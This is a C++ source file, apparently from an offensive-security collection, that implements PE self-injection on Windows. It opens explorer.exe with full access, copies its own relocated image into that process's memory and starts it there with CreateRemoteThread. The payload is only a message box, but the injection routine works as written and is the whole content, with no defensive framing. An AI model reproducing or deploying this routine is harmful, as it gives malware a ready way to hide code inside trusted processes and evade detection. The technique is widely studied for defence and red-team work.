#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD self()
{	
	MessageBoxA(NULL, "PE Injection", "Hello from Offensive-Panda", NULL);
	return 0;
}

HANDLE GetProcessHandle(const wchar_t* processName) {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Take a snapshot of all processes
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Failed to create process snapshot." << std::endl;
		return NULL;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hProcessSnap, &pe32)) {  // Retrieve the first process information
		std::wcerr << L"Failed to retrieve the first process information." << std::endl;
		CloseHandle(hProcessSnap);
		return NULL;
	}

	do {
		if (_wcsicmp(pe32.szExeFile, processName) == 0) {  // Compare process name with "explorer.exe"
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess == NULL) {
				std::wcerr << L"Failed to open process handle for " << processName << L". Error: " << GetLastError() << std::endl;
			}
			else {
				CloseHandle(hProcessSnap);  // Close snapshot handle after use
				return hProcess;  // Return the handle to the explorer.exe process
			}
		}
	} while (Process32NextW(hProcessSnap, &pe32));  // Continue to the next process

	CloseHandle(hProcessSnap);  // Close snapshot handle if process not found
	std::wcerr << L"Process " << processName << L" not found." << std::endl;
	return NULL;
}
int main()
{
	const wchar_t* processName = L"explorer.exe";
	HANDLE hExp = GetProcessHandle(processName);
	// Get current image's base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID lImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(lImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Allote a new memory block in the target process. This is where we will be injecting this PE
	PVOID tImage = VirtualAllocEx(hExp, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaBase = (DWORD_PTR)tImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)lImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(hExp, tImage, lImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(hExp, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)self + deltaBase), NULL, 0, NULL);

	return 0;
}